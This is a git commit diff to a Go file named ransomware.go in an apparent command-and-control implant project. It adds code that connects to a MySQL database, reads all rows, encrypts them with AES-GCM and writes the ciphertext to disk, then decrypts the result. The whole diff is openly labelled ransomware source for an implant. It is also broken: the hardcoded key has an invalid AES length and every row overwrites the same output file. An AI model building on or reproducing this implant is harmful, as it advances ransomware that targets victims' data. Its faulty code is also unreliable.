51c87296e2bb8990777b2ae5205605585124259f
datboyblu3 <datboyblu3@protonmail.com>
2026-02-12 12:45:47 -0500

    created sql connectiion functionality

--- containerized-c2-project/implant/ransomware.go
+++ containerized-c2-project/implant/ransomware.go
@@ -4,8 +4,12 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"database/sql"
 	"fmt"
 	"os"
+	"time"
+
+	_ "github.com/go-sql-driver/mysql"
 )
 
 func Encrypt(plaintext []byte, key []byte) ([]byte, error) {
@@ -28,7 +32,7 @@ func Encrypt(plaintext []byte, key []byte) ([]byte, error) {
 	return append(nonce, ciphertext...), nil
 }
 
-func Decrypt(ciphertext []byte), key []byte ([]byte, error) {
+func Decrypt(ciphertext []byte, key []byte) ([]byte, error) {
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
@@ -56,34 +60,67 @@ func Decrypt(ciphertext []byte), key []byte ([]byte, error) {
 func writeToFile(filename string, content []byte) error {
 	tmpFilePath := filename + ".tmp"
 
-	//Write content to a temp file
 	err := os.WriteFile(tmpFilePath, content, 0644)
 	if err != nil {
 		return err
 	}
 
-	return os.NewFile()
+	return os.Rename(tmpFilePath, filename)
 }
 
 func doEncrypt(currentDir string, key []byte) {
+	db, err := sql.Open("mysql", "user:password@tcp(localhost:3306)/dbname")
+	if err != nil {
+		panic(err.Error())
+	}
+	defer db.Close()
 
+	rows, err := db.Query("SELECT * FROM table_name")
+	if err != nil {
+		panic(err.Error())
+	}
+	defer rows.Close()
+
+	for rows.Next() {
+		var data []byte
+		err := rows.Scan(&data)
+		if err != nil {
+			panic(err.Error())
+		}
+
+		encryptedData, err := Encrypt(data, key)
+		if err != nil {
+			panic(err.Error())
+		}
+
+		writeToFile(currentDir+"/encrypted_data.bin", encryptedData)
+	}
 }
 
 func doDecrypt(currentDir string, key []byte) {
+	encryptedData, err := os.ReadFile(currentDir + "/encrypted_data.bin")
+	if err != nil {
+		panic(err.Error())
+	}
 
+	decryptedData, err := Decrypt(encryptedData, key)
+	if err != nil {
+		panic(err.Error())
+	}
+
+	writeToFile(currentDir+"/decrypted_data.txt", decryptedData)
 }
 
 func main() {
 	key := []byte("PutYourKeyEncryptionKeyHere1234567890")
 
-	//Get the current working directory
 	currentDir, err := os.Getwd()
-
 	if err != nil {
 		fmt.Println("Error getting current directory:", err)
 		return
 	}
 
 	doEncrypt(currentDir, key)
+	time.Sleep(time.Second * 2) // Wait for encryption to complete
 	doDecrypt(currentDir, key)
 }
